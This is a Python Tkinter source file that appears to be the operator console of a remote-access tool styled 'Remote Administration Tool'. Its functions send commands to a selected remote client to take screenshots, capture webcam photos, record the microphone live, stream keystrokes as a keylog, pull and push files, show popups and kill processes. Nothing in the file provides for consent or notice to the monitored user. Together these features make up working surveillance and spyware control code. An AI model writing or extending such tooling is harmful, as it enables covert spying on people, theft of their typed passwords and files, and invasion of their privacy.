"""
gui_features.py - Advanced Features: Screenshot, File Transfer, Popup, Dialogs
"""
import os
import io
import base64
import threading
import tkinter as tk
from tkinter import messagebox, filedialog, simpledialog, ttk
from datetime import datetime
from PIL import Image, ImageTk
import gui_globals as g


def log_message(message, level="INFO"):
    g.log_message(message, level)


# ── Screenshot ────────────────────────────────────────────────────────────────

def capture_screenshot():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    g.terminal_output.delete("input_start", "end")
    g.terminal_output.insert(tk.END, "SCREENSHOT\n", "command")
    g.terminal_output.mark_set("input_start", "end-1c")
    import gui_commands as cmds
    threading.Thread(target=cmds.execute_command, args=("SCREENSHOT", "Capture Screenshot"), daemon=True).start()


def capture_webcam():
    """Request webcam photo from client."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    g.terminal_output.delete("input_start", "end")
    g.terminal_output.insert(tk.END, "WEBCAM\n", "command")
    g.terminal_output.insert(tk.END, "⏳ Activating webcam...\n", "loading")
    g.terminal_output.mark_set("input_start", "end-1c")
    import gui_commands as cmds
    threading.Thread(target=cmds.execute_command, args=("WEBCAM", "Webcam Capture"), daemon=True).start()


def show_webcam_photo(img_data_b64, resolution="?"):
    """Display webcam photo in a new popup window."""
    try:
        img_data = base64.b64decode(img_data_b64)
        photo_image = Image.open(io.BytesIO(img_data))

        win = tk.Toplevel(g.root)
        win.title(f"📷 Webcam Capture  —  {resolution}")
        win.configure(bg="#0D0D0D")
        win.resizable(True, True)
        win.pil_image = photo_image  # keep reference

        # ── Header ──────────────────────────────────────────────────────────
        header = tk.Frame(win, bg="#1A1A2E", height=65)
        header.pack(fill="x")
        header.pack_propagate(False)

        lf = tk.Frame(header, bg="#1A1A2E")
        lf.pack(side="left", padx=20, pady=12)
        tk.Label(lf, text="📷  WEBCAM CAPTURE", font=("Segoe UI", 14, "bold"), bg="#1A1A2E", fg="#E94560").pack(anchor="w")
        tk.Label(lf, text=f"Resolution: {resolution}  •  {datetime.now().strftime('%H:%M:%S')}", font=("Segoe UI", 9), bg="#1A1A2E", fg="#90CAF9").pack(anchor="w")

        def save_photo():
            fn = filedialog.asksaveasfilename(
                defaultextension=".jpg",
                filetypes=[("JPEG", "*.jpg"), ("PNG", "*.png"), ("All", "*.*")],
                initialfile=f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            )
            if fn:
                try:
                    win.pil_image.save(fn, quality=95)
                    messagebox.showinfo("Saved", f"Photo saved:\n{fn}")
                    log_message(f"Webcam photo saved: {fn}", "SUCCESS")
                except Exception as e:
                    messagebox.showerror("Error", str(e))

        rf = tk.Frame(header, bg="#1A1A2E")
        rf.pack(side="right", padx=20, pady=10)
        tk.Button(rf, text="📷 New Capture", command=lambda: [win.destroy(), capture_webcam()],
                  font=("Segoe UI", 10, "bold"), bg="#E94560", fg="white", relief="flat",
                  padx=18, pady=8, cursor="hand2").pack(side="left", padx=5)
        tk.Button(rf, text="💾 Save",  command=save_photo,
                  font=("Segoe UI", 10, "bold"), bg="#4CAF50", fg="white", relief="flat",
                  padx=18, pady=8, cursor="hand2").pack(side="left", padx=5)
        tk.Button(rf, text="✗ Close", command=win.destroy,
                  font=("Segoe UI", 10), bg="#555", fg="white", relief="flat",
                  padx=18, pady=8, cursor="hand2").pack(side="left", padx=5)

        # ── Image display ────────────────────────────────────────────────────
        img_w, img_h = photo_image.size
        max_w = min(img_w, g.root.winfo_screenwidth()  - 100)
        max_h = min(img_h, g.root.winfo_screenheight() - 200)
        display = photo_image.copy()
        display.thumbnail((max_w, max_h), Image.Resampling.LANCZOS)

        canvas = tk.Canvas(win, bg="#0D0D0D", highlightthickness=0)
        sv = tk.Scrollbar(win, orient="vertical",   command=canvas.yview)
        sh = tk.Scrollbar(win, orient="horizontal", command=canvas.xview)
        frame = tk.Frame(canvas, bg="#0D0D0D")
        canvas.create_window((0, 0), window=frame, anchor="nw")
        canvas.configure(yscrollcommand=sv.set, xscrollcommand=sh.set)

        photo = ImageTk.PhotoImage(display)
        lbl = tk.Label(frame, image=photo, bg="#0D0D0D")
        lbl.image = photo
        lbl.pack(padx=10, pady=10)
        frame.update_idletasks()
        canvas.configure(scrollregion=canvas.bbox("all"))
        canvas.pack(side="left", fill="both", expand=True)
        sv.pack(side="right", fill="y")
        sh.pack(side="bottom", fill="x")

        dw, dh = display.size
        win.geometry(f"{dw+40}x{dh+100}")
        win.update_idletasks()
        log_message(f"Webcam photo displayed: {resolution}", "SUCCESS")

    except Exception as e:
        log_message(f"Webcam display error: {e}", "ERROR")
        messagebox.showerror("Webcam Error", str(e))


def show_screenshot(img_data_b64):
    try:
        img_data = base64.b64decode(img_data_b64)
        original_image = Image.open(io.BytesIO(img_data))
        screen_w = g.root.winfo_screenwidth()
        screen_h = g.root.winfo_screenheight()
        is_4k = screen_w >= 3840 or screen_h >= 2160
        is_2k = screen_w >= 2560 or screen_h >= 1440
        display_image = original_image.copy()
        if is_4k:
            max_size, win_size = (3200, 2400), "3200x2000"
        elif is_2k:
            max_size, win_size = (2400, 1800), "2400x1600"
        else:
            max_size, win_size = (1920, 1440), "1920x1200"
        orig_w, orig_h = original_image.size
        if orig_w > max_size[0] or orig_h > max_size[1]:
            display_image.thumbnail(max_size, Image.Resampling.LANCZOS)
            from PIL import ImageFilter, ImageEnhance
            display_image = display_image.filter(ImageFilter.UnsharpMask(radius=1, percent=150, threshold=2))
            display_image = ImageEnhance.Contrast(display_image).enhance(1.05)

        win = tk.Toplevel(g.root)
        win.title(f"📸 Screenshot - {orig_w}x{orig_h}")
        win.configure(bg="#1E1E1E")
        win.geometry(win_size)
        win.pil_image = original_image

        def save_img():
            fn = filedialog.asksaveasfilename(
                defaultextension=".png",
                filetypes=[("PNG", "*.png"), ("JPEG", "*.jpg"), ("All", "*.*")],
                initialfile=f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            )
            if fn:
                try:
                    if fn.lower().endswith(('.jpg', '.jpeg')):
                        win.pil_image.save(fn, "JPEG", quality=99, optimize=True)
                    else:
                        win.pil_image.save(fn, "PNG", compress_level=1)
                    size_mb = os.path.getsize(fn) / 1048576
                    messagebox.showinfo("Saved", f"Saved! ({orig_w}x{orig_h}, {size_mb:.2f}MB)")
                except Exception as e:
                    messagebox.showerror("Error", str(e))

        header = tk.Frame(win, bg="#263238", height=70)
        header.pack(fill="x")
        header.pack_propagate(False)
        tf = tk.Frame(header, bg="#263238")
        tf.pack(side="left", padx=20, pady=15)
        tk.Label(tf, text="📸 Screenshot", font=("Segoe UI", 14, "bold"), bg="#263238", fg="white").pack(anchor="w")
        quality = "4K" if is_4k else ("2K" if is_2k else "HD")
        tk.Label(tf, text=f"{orig_w}x{orig_h} • {quality}", font=("Segoe UI", 10), bg="#263238", fg="#90CAF9").pack(anchor="w")
        bf = tk.Frame(header, bg="#263238")
        bf.pack(side="right", padx=20, pady=10)
        tk.Button(bf, text="💾 Save", command=save_img, font=("Segoe UI", 11, "bold"), bg="#4CAF50", fg="white", relief="flat", padx=25, pady=10, cursor="hand2").pack(side="left", padx=5)
        tk.Button(bf, text="🔍 100%", command=lambda: show_original_size(original_image), font=("Segoe UI", 11, "bold"), bg="#2196F3", fg="white", relief="flat", padx=25, pady=10, cursor="hand2").pack(side="left", padx=5)
        tk.Button(bf, text="✗ Close", command=win.destroy, font=("Segoe UI", 11), bg="#757575", fg="white", relief="flat", padx=25, pady=10, cursor="hand2").pack(side="left", padx=5)

        canvas = tk.Canvas(win, bg="#1E1E1E", highlightthickness=0)
        sv = tk.Scrollbar(win, orient="vertical", command=canvas.yview)
        sh = tk.Scrollbar(win, orient="horizontal", command=canvas.xview)
        frame = tk.Frame(canvas, bg="#1E1E1E")
        canvas.create_window((0, 0), window=frame, anchor="nw")
        canvas.configure(yscrollcommand=sv.set, xscrollcommand=sh.set)
        photo = ImageTk.PhotoImage(display_image)
        lbl = tk.Label(frame, image=photo, bg="#1E1E1E")
        lbl.image = photo
        lbl.pack(padx=20, pady=20)
        frame.update_idletasks()
        canvas.configure(scrollregion=canvas.bbox("all"))
        canvas.pack(side="left", fill="both", expand=True)
        sv.pack(side="right", fill="y")
        sh.pack(side="bottom", fill="x")

        def scroll(event):
            if event.num == 4:
                canvas.yview_scroll(-1, "units")
            elif event.num == 5:
                canvas.yview_scroll(1, "units")
            else:
                canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        win.bind("<MouseWheel>", scroll)
        win.bind("<Button-4>", scroll)
        win.bind("<Button-5>", scroll)
        log_message(f"Screenshot: {orig_w}x{orig_h}", "SUCCESS")
    except Exception as e:
        log_message(f"Screenshot display error: {e}", "ERROR")
        messagebox.showerror("Error", str(e))


def show_original_size(image):
    try:
        w, h = image.size
        win = tk.Toplevel(g.root)
        win.title("📸 Original Size (100%)")
        win.configure(bg="#1E1E1E")
        sw = min(w + 40, g.root.winfo_screenwidth() - 50)
        sh = min(h + 100, g.root.winfo_screenheight() - 50)
        win.geometry(f"{sw}x{sh}")
        header = tk.Frame(win, bg="#263238", height=60)
        header.pack(fill="x")
        header.pack_propagate(False)
        tk.Label(header, text=f"📸 100% Size  •  {w}x{h}", font=("Segoe UI", 12, "bold"), bg="#263238", fg="white").pack(side="left", padx=20, pady=15)
        tk.Button(header, text="✗ Close", command=win.destroy, font=("Segoe UI", 11), bg="#757575", fg="white", relief="flat", padx=25, pady=8, cursor="hand2").pack(side="right", padx=20, pady=10)
        canvas = tk.Canvas(win, bg="#1E1E1E")
        sv = tk.Scrollbar(win, orient="vertical", command=canvas.yview)
        sh2 = tk.Scrollbar(win, orient="horizontal", command=canvas.xview)
        frame = tk.Frame(canvas, bg="#1E1E1E")
        frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=frame, anchor="nw")
        canvas.configure(yscrollcommand=sv.set, xscrollcommand=sh2.set)
        photo = ImageTk.PhotoImage(image)
        lbl = tk.Label(frame, image=photo, bg="#1E1E1E")
        lbl.image = photo
        lbl.pack(padx=20, pady=20)
        canvas.pack(side="left", fill="both", expand=True, padx=(20, 0), pady=(0, 20))
        sv.pack(side="right", fill="y", pady=(0, 20))
        sh2.pack(side="bottom", fill="x", padx=(20, 0))
    except Exception as e:
        messagebox.showerror("Error", str(e))


# ── Microphone / Audio ─────────────────────────────────────────────────────────

def capture_microphone():
    """Toggle microphone live recording on/off."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return

    import gui_commands as cmds

    if not g.mic_active:
        g.mic_active = True
        btn = g.mic_button
        if btn:
            btn.config(text="⏹ Stop Mic", bg="#D32F2F")
        g.terminal_output.delete("input_start", "end")
        g.terminal_output.insert(tk.END, "🎤 Microphone recording started — press 'Stop Mic' to end\n", "loading")
        g.terminal_output.mark_set("input_start", "end-1c")
        threading.Thread(target=cmds.start_mic_stream, daemon=True).start()
    else:
        threading.Thread(target=cmds.stop_mic, daemon=True).start()


def save_audio_file(audio_data_b64, duration, sample_rate):
    """Prompt user to save a received audio recording — converts to MP3 automatically."""
    try:
        audio_data = base64.b64decode(audio_data_b64)

        ask = messagebox.askyesno(
            "🎤 Recording Complete",
            f"Audio recorded successfully! ({duration}s, {len(audio_data) / 1024:.0f}KB)\n\nSave audio file?",
            icon="question"
        )
        if not ask:
            return

        saved = False
        save_path = None

        # ── Try MP3 via pydub ──────────────────────────────────────────────
        try:
            from pydub import AudioSegment
            import io as _io

            wav_io = _io.BytesIO(audio_data)
            segment = AudioSegment.from_wav(wav_io)

            save_path = filedialog.asksaveasfilename(
                defaultextension=".mp3",
                filetypes=[("MP3 Audio", "*.mp3"), ("WAV Audio", "*.wav"), ("All Files", "*.*")],
                initialfile=f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
            )
            if save_path:
                if save_path.lower().endswith(".mp3"):
                    segment.export(save_path, format="mp3", bitrate="192k")
                else:
                    segment.export(save_path, format="wav")
                saved = True

        except ImportError:
            pass
        except Exception:
            pass

        # ── Fallback: save raw WAV ─────────────────────────────────────────
        if not saved:
            save_path = filedialog.asksaveasfilename(
                defaultextension=".wav",
                filetypes=[("WAV Audio", "*.wav"), ("All Files", "*.*")],
                initialfile=f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            )
            if save_path:
                with open(save_path, 'wb') as f:
                    f.write(audio_data)
                saved = True

        if saved and save_path:
            size_mb = os.path.getsize(save_path) / (1024 * 1024)
            ext = os.path.splitext(save_path)[1].upper()
            g.terminal_output.insert(tk.END, f"✓ Audio saved: {save_path} ({size_mb:.2f}MB, {duration}s) [{ext}]\n", "success")
            log_message(f"Audio saved: {save_path} ({size_mb:.2f}MB, {duration}s)", "SUCCESS")

            try:
                import platform as _plat
                if _plat.system() == "Windows":
                    os.startfile(save_path)
                elif _plat.system() == "Darwin":
                    import subprocess
                    subprocess.run(["open", save_path], check=False)
                else:
                    import subprocess
                    subprocess.run(["xdg-open", save_path], check=False)
            except Exception:
                pass

    except Exception as e:
        g.terminal_output.insert(tk.END, f"❌ Save failed: {str(e)}\n", "error")
        log_message(f"Audio save error: {e}", "ERROR")


# ── File Transfer ─────────────────────────────────────────────────────────────

def save_downloaded_file(filename, data_b64):
    try:
        save_path = filedialog.asksaveasfilename(initialfile=filename, defaultextension=".*")
        if save_path:
            with open(save_path, 'wb') as f:
                f.write(base64.b64decode(data_b64))
            g.terminal_output.insert(tk.END, f"✓ File downloaded: {save_path}\n", "success")
            log_message(f"File downloaded: {save_path}", "SUCCESS")
    except Exception as e:
        g.terminal_output.insert(tk.END, f"❌ Save failed: {str(e)}\n", "error")


def download_file_from_client():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    filepath = simpledialog.askstring("Download File", "Enter file path on client:\n(e.g., C:\\Users\\file.txt)")
    if filepath:
        g.terminal_output.delete("input_start", "end")
        g.terminal_output.insert(tk.END, f"DOWNLOAD:{filepath}\n", "command")
        g.terminal_output.mark_set("input_start", "end-1c")
        import gui_commands as cmds
        threading.Thread(target=cmds.execute_command, args=(f"DOWNLOAD:{filepath}", f"Download: {filepath}"), daemon=True).start()


def upload_file_to_client():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return
    filepath = filedialog.askopenfilename(title="Select file to upload")
    if filepath:
        try:
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            filename = os.path.basename(filepath)
            cmd = f"UPLOAD:{filename}:{file_data}"
            g.terminal_output.delete("input_start", "end")
            g.terminal_output.insert(tk.END, f"Uploading {filename}...\n", "command")
            g.terminal_output.mark_set("input_start", "end-1c")
            import gui_commands as cmds
            threading.Thread(target=cmds.execute_command, args=(cmd, f"Upload: {filename}"), daemon=True).start()
        except Exception as e:
            messagebox.showerror("Upload Error", str(e))


# ── Popup Messaging ───────────────────────────────────────────────────────────

def send_popup_message():
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return

    dialog = tk.Toplevel(g.root)
    dialog.title("💬 Send Remote Popup Alert")
    dialog.geometry("550x450")
    dialog.configure(bg="#1A1A22")
    dialog.resizable(False, False)
    dialog.transient(g.root)
    dialog.grab_set()

    # Title label
    tk.Label(dialog, text="💬 SEND REMOTE POPUP", font=("Segoe UI", 14, "bold"), bg="#1A1A22", fg="#00E5FF").pack(pady=(20, 10))

    # Form Container
    form = tk.Frame(dialog, bg="#1A1A22")
    form.pack(fill="both", expand=True, padx=40)

    # Title Input
    tk.Label(form, text="Alert Title:", font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#ECEFF1").pack(anchor="w", pady=(5, 2))
    title_entry = tk.Entry(form, font=("Segoe UI", 11), bg="#2D2D38", fg="white", insertbackground="white", relief="flat", bd=1)
    title_entry.pack(fill="x", ipady=5)
    title_entry.insert(0, "SYSTEM ALERT")

    # Message Input
    tk.Label(form, text="Alert Message:", font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#ECEFF1").pack(anchor="w", pady=(15, 2))
    msg_entry = tk.Entry(form, font=("Segoe UI", 11), bg="#2D2D38", fg="white", insertbackground="white", relief="flat", bd=1)
    msg_entry.pack(fill="x", ipady=5)
    msg_entry.insert(0, "This is a remote administrative alert message.")

    # Popup Type Selector
    tk.Label(form, text="Alert Style / Type:", font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#ECEFF1").pack(anchor="w", pady=(15, 2))
    style_var = tk.StringVar(value="CYBER")

    styles_frame = tk.Frame(form, bg="#1A1A22")
    styles_frame.pack(fill="x", pady=5)

    styles = [
        ("Cyber Alert", "CYBER"),
        ("Info Box", "INFO"),
        ("Warning Box", "WARNING"),
        ("Error Box", "ERROR"),
        ("Override Alarm", "OVERRIDE"),
    ]

    # Create radio buttons with modern dark styling
    for i, (label, val) in enumerate(styles):
        row = i // 2
        col = i % 2
        rb = tk.Radiobutton(
            styles_frame, text=label, variable=style_var, value=val,
            font=("Segoe UI", 10), bg="#1A1A22", fg="#ECEFF1",
            selectcolor="#2D2D38", activebackground="#1A1A22", activeforeground="#00E5FF",
            cursor="hand2"
        )
        rb.grid(row=row, column=col, sticky="w", padx=10, pady=5)

    def execute():
        title = title_entry.get().strip()
        msg = msg_entry.get().strip()
        style = style_var.get()

        if not title or not msg:
            messagebox.showerror("Error", "Title and Message cannot be empty!")
            return

        def _popup_field(value):
            if ":" in value or value.startswith("B64~"):
                return "B64~" + base64.urlsafe_b64encode(value.encode("utf-8")).decode("ascii")
            return value

        cmd = f"POPUP:{style}:{_popup_field(title)}:{_popup_field(msg)}"
        
        g.terminal_output.delete("input_start", "end")
        g.terminal_output.insert(tk.END, f"Sending {style} popup alert...\n", "command")
        g.terminal_output.mark_set("input_start", "end-1c")
        
        import gui_commands as cmds
        threading.Thread(target=cmds.execute_command, args=(cmd, f"Send Popup ({style})"), daemon=True).start()
        dialog.destroy()

    # Buttons Frame
    btn_frame = tk.Frame(dialog, bg="#1A1A22")
    btn_frame.pack(pady=25)

    send_btn = tk.Button(btn_frame, text="🚀 Send Alert", command=execute, font=("Segoe UI", 11, "bold"), bg="#00E5FF", fg="#121214", relief="flat", padx=30, pady=10, cursor="hand2")
    send_btn.pack(side="left", padx=10)

    cancel_btn = tk.Button(btn_frame, text="✗ Cancel", command=dialog.destroy, font=("Segoe UI", 11), bg="#555562", fg="white", relief="flat", padx=30, pady=10, cursor="hand2")
    cancel_btn.pack(side="left", padx=10)

    # Hover animations (Micro-animations)
    def on_send_enter(e): send_btn.config(bg="#00B0FF")
    def on_send_leave(e): send_btn.config(bg="#00E5FF")
    send_btn.bind("<Enter>", on_send_enter)
    send_btn.bind("<Leave>", on_send_leave)

    def on_cancel_enter(e): cancel_btn.config(bg="#6A6A7D")
    def on_cancel_leave(e): cancel_btn.config(bg="#555562")
    cancel_btn.bind("<Enter>", on_cancel_enter)
    cancel_btn.bind("<Leave>", on_cancel_leave)

    # Focus title entry
    title_entry.focus()


# ── Misc UI ───────────────────────────────────────────────────────────────────

def clear_terminal():
    g.terminal_output.delete("1.0", tk.END)
    g.terminal_output.insert(tk.END, "Remote-Admin> ", "prompt")
    g.terminal_output.mark_set("input_start", "end-1c")
    log_message("Terminal cleared", "INFO")


def save_terminal():
    content = g.terminal_output.get("1.0", tk.END)
    if content.strip():
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text", "*.txt"), ("Log", "*.log")])
        if filename:
            with open(filename, "w") as f:
                f.write(content)
            log_message(f"Saved: {filename}", "SUCCESS")


def show_about():
    about = tk.Toplevel(g.root)
    about.title("About Remote Admin Tool")
    about.geometry("500x450")
    about.configure(bg="#1E1E1E")
    about.resizable(False, False)
    tk.Label(about, text="🖥️", font=("Segoe UI", 56), bg="#1E1E1E", fg="#FFFFFF").pack(pady=25)
    tk.Label(about, text="Remote Administration Tool", font=("Segoe UI", 18, "bold"), bg="#1E1E1E", fg="#FFFFFF").pack()
    tk.Label(about, text="Enterprise Edition v2.0", font=("Segoe UI", 11), bg="#1E1E1E", fg="#9E9E9E").pack(pady=8)
    features = tk.Text(about, font=("Segoe UI", 10), bg="#2D2D30", fg="#CCCCCC", height=7, relief="flat", borderwidth=0)
    features.pack(pady=15, padx=40, fill="x")
    features.insert("1.0", "✓ Multiple Client Support\n✓ Screenshot Capture\n✓ File Transfer (Upload/Download)\n✓ Interactive Terminal\n✓ System Control\n✓ Process Management\n✓ Cyberpunk Popup Messaging")
    features.config(state="disabled")
    tk.Label(about, text="© 2026 Nirupam Pal", font=("Segoe UI", 10), bg="#1E1E1E", fg="#757575").pack(pady=15)
    tk.Button(about, text="Close", command=about.destroy, font=("Segoe UI", 11, "bold"), bg="#1976D2", fg="white", relief="flat", padx=40, pady=10, cursor="hand2").pack(pady=15)


# ── Keylog / Keyboard Live-Stream ──────────────────────────────────────────────

def capture_keylog():
    """Toggle keylog live-stream on/off."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client!")
        return

    import gui_commands as cmds

    if not g.keylog_active:
        g.keylog_active = True
        btn = g.keylog_button
        if btn:
            btn.config(text="⏹ Stop Keylog", bg="#D32F2F")
        g.terminal_output.delete("input_start", "end")
        g.terminal_output.insert(tk.END, "⌨️ Keylog live-stream started — press 'Stop Keylog' to end\n", "loading")
        g.terminal_output.mark_set("input_start", "end-1c")
        threading.Thread(target=cmds.start_keylog_stream, daemon=True).start()
    else:
        cmds.stop_keylog()


def request_process_list():
    """Request process list from client."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return

    # Singleton Guard
    if g.task_manager_window and g.task_manager_window.winfo_exists():
        g.task_manager_window.lift()
        g.task_manager_window.focus_force()
        g.task_manager_window.refresh()
        return

    import gui_commands as cmds
    g.terminal_output.delete("input_start", "end")
    g.terminal_output.insert(tk.END, "PROCESS_LIST\n", "command")
    g.terminal_output.insert(tk.END, "⏳ Loading task manager...\n", "loading")
    g.terminal_output.mark_set("input_start", "end-1c")
    threading.Thread(target=cmds.execute_command, args=("PROCESS_LIST", "Get Process List"), daemon=True).start()

def show_task_manager(processes):
    """Create or refresh the visual task manager window"""
    if g.task_manager_window and g.task_manager_window.winfo_exists():
        g.task_manager_window.update_data(processes)
        return

    win = tk.Toplevel(g.root)
    win.title("🎯 Remote Task Manager")
    win.geometry("750x600")
    win.minsize(600, 400)
    win.configure(bg="#FAFAFA")
    g.task_manager_window = win

    header = tk.Frame(win, bg="#1976D2", height=60)
    header.pack(fill="x")
    header.pack_propagate(False)
    tk.Label(header, text="🎯  Remote Task Manager", font=("Segoe UI", 13, "bold"), bg="#1976D2", fg="white").pack(side="left", padx=20)
    
    search_frame = tk.Frame(win, bg="#FAFAFA")
    search_frame.pack(fill="x", padx=20, pady=10)
    tk.Label(search_frame, text="🔍 Search:", font=("Segoe UI", 10), bg="#FAFAFA").pack(side="left", padx=(0, 5))
    search_var = tk.StringVar()
    search_entry = tk.Entry(search_frame, textvariable=search_var, font=("Segoe UI", 10), width=30)
    search_entry.pack(side="left")
    search_entry.focus()

    tree_frame = tk.Frame(win, bg="#FAFAFA")
    tree_frame.pack(fill="both", expand=True, padx=20, pady=10)

    columns = ("PID", "Name", "Status", "Memory (MB)")
    tree = ttk.Treeview(tree_frame, columns=columns, show="headings", height=15)
    tree.heading("PID", text="PID", anchor="center")
    tree.heading("Name", text="Name", anchor="w")
    tree.heading("Status", text="Status", anchor="center")
    tree.heading("Memory (MB)", text="Memory (MB)", anchor="e")

    tree.column("PID", width=80, anchor="center")
    tree.column("Name", width=300, anchor="w")
    tree.column("Status", width=120, anchor="center")
    tree.column("Memory (MB)", width=120, anchor="e")

    vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=tree.yview)
    tree.configure(yscrollcommand=vsb.set)
    vsb.pack(side="right", fill="y")
    tree.pack(side="left", fill="both", expand=True)

    all_processes = list(processes)

    def populate(filter_str=""):
        tree.delete(*tree.get_children())
        for proc in all_processes:
            name = proc.get("name", "Unknown")
            pid = str(proc.get("pid", ""))
            status = proc.get("status", "unknown")
            memory = str(proc.get("memory", "0"))

            if filter_str and filter_str.lower() not in name.lower() and filter_str not in pid:
                continue
            
            tree.insert("", "end", values=(pid, name, status, memory))

    def on_search(*args):
        populate(search_var.get())
    search_var.trace_add("write", on_search)

    def kill_selected():
        selected = tree.selection()
        if not selected:
            messagebox.showwarning("No Selection", "Please select a process first!")
            return
        item = tree.item(selected[0])
        pid = item["values"][0]
        name = item["values"][1]
        
        if messagebox.askyesno("Confirm Terminate", f"Are you sure you want to terminate process {name} (PID: {pid})?"):
            import gui_commands as cmds
            g.terminal_output.delete("input_start", "end")
            g.terminal_output.insert(tk.END, f"KILL_PROCESS:{pid}\n", "command")
            g.terminal_output.mark_set("input_start", "end-1c")
            threading.Thread(target=cmds.execute_command, args=(f"KILL_PROCESS:{pid}", f"Kill Process {pid}"), daemon=True).start()

    def refresh():
        import gui_commands as cmds
        threading.Thread(target=cmds.execute_command, args=("PROCESS_LIST", "Get Process List"), daemon=True).start()

    btn_frame = tk.Frame(win, bg="#FAFAFA")
    btn_frame.pack(fill="x", padx=20, pady=15)
    
    tk.Button(btn_frame, text="❌ Terminate Process", command=kill_selected, font=("Segoe UI", 10, "bold"), bg="#D32F2F", fg="white", relief="flat", padx=15, pady=8, cursor="hand2").pack(side="left")
    tk.Button(btn_frame, text="🔄 Refresh", command=refresh, font=("Segoe UI", 10), bg="#1976D2", fg="white", relief="flat", padx=15, pady=8, cursor="hand2").pack(side="left", padx=10)
    tk.Button(btn_frame, text="Close", command=win.destroy, font=("Segoe UI", 10), bg="#757575", fg="white", relief="flat", padx=15, pady=8, cursor="hand2").pack(side="right")

    win.update_data = lambda data: [all_processes.clear(), all_processes.extend(data), populate(search_var.get())]
    win.refresh = refresh

    populate()

def show_performance_dashboard():
    """Show the real-time performance dashboard for CPU, Memory, and Disk usage"""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return

    if g.dashboard_window and g.dashboard_window.winfo_exists():
        g.dashboard_window.lift()
        g.dashboard_window.focus_force()
        return

    win = tk.Toplevel(g.root)
    win.title("📊 Live Performance Monitor")
    win.geometry("450x380")
    win.resizable(False, False)
    win.configure(bg="#FAFAFA")
    g.dashboard_window = win

    header = tk.Frame(win, bg="#00ACC1", height=55)
    header.pack(fill="x")
    header.pack_propagate(False)
    tk.Label(header, text="📊 Live Performance Monitor", font=("Segoe UI", 12, "bold"), bg="#00ACC1", fg="white").pack(side="left", padx=20)

    main_frame = tk.Frame(win, bg="#FAFAFA")
    main_frame.pack(fill="both", expand=True, padx=25, pady=20)

    cpu_frame = tk.Frame(main_frame, bg="#FAFAFA")
    cpu_frame.pack(fill="x", pady=10)
    cpu_lbl = tk.Label(cpu_frame, text="CPU Usage: --%", font=("Segoe UI", 11, "bold"), bg="#FAFAFA", fg="#333")
    cpu_lbl.pack(anchor="w")
    cpu_bar = ttk.Progressbar(cpu_frame, orient="horizontal", mode="determinate", length=350)
    cpu_bar.pack(pady=5)

    ram_frame = tk.Frame(main_frame, bg="#FAFAFA")
    ram_frame.pack(fill="x", pady=10)
    ram_lbl = tk.Label(ram_frame, text="Memory Usage: --%", font=("Segoe UI", 11, "bold"), bg="#FAFAFA", fg="#333")
    ram_lbl.pack(anchor="w")
    ram_bar = ttk.Progressbar(ram_frame, orient="horizontal", mode="determinate", length=350)
    ram_bar.pack(pady=5)

    disk_frame = tk.Frame(main_frame, bg="#FAFAFA")
    disk_frame.pack(fill="x", pady=10)
    disk_lbl = tk.Label(disk_frame, text="Disk Usage: --%", font=("Segoe UI", 11, "bold"), bg="#FAFAFA", fg="#333")
    disk_lbl.pack(anchor="w")
    disk_bar = ttk.Progressbar(disk_frame, orient="horizontal", mode="determinate", length=350)
    disk_bar.pack(pady=5)

    win.after_id = None
    win.metrics_pending = False

    def poll():
        if not g.active_client_id or not win.winfo_exists():
            return
        if not win.metrics_pending:
            win.metrics_pending = True
            import gui_commands as cmds
            def _run_metrics():
                try:
                    cmds.execute_command("SYSTEM_METRICS", "Get System Metrics")
                finally:
                    g.root.after(0, lambda: setattr(win, "metrics_pending", False) if win.winfo_exists() else None)
            threading.Thread(target=_run_metrics, daemon=True).start()
        win.after_id = win.after(3000, poll)

    def update_metrics(data):
        if not win.winfo_exists():
            return
        cpu = data.get("cpu", 0.0)
        ram = data.get("ram", 0.0)
        disk = data.get("disk", 0.0)

        cpu_lbl.config(text=f"CPU Usage: {cpu}%")
        cpu_bar.config(value=cpu)

        ram_lbl.config(text=f"Memory Usage: {ram}%")
        ram_bar.config(value=ram)

        disk_lbl.config(text=f"Disk Usage: {disk}%")
        disk_bar.config(value=disk)

    win.update_metrics = update_metrics

    def on_close():
        if win.after_id:
            try:
                win.after_cancel(win.after_id)
            except Exception:
                pass
        g.dashboard_window = None
        win.destroy()

    win.protocol("WM_DELETE_WINDOW", on_close)

    poll()


# ── Visual File Manager ────────────────────────────────────────────────────────

def request_file_browser(path):
    """Request directory contents from remote client."""
    if not g.active_client_id:
        messagebox.showerror("No Client", "Please select a client first!")
        return

    path = path.strip()

    # Create/initialize the window if it doesn't exist
    if not g.file_manager_window or not g.file_manager_window.winfo_exists():
        create_file_manager_window()
    else:
        g.file_manager_window.lift()
        g.file_manager_window.focus_force()

    g.file_manager_window.last_requested_path = path
    g.file_manager_window.show_loading(f"Loading {path or 'current directory'}...")

    import gui_commands as cmds
    # Execute the FILE_BROWSER:<path> command in a background thread
    threading.Thread(
        target=cmds.execute_command,
        args=(f"FILE_BROWSER:{path}", f"List Directory: {path}"),
        daemon=True,
        name=f"FileBrowser-{path[:15]}"
    ).start()


def create_file_manager_window():
    """Create the singleton File Manager window with initial layout."""
    win = tk.Toplevel(g.root)
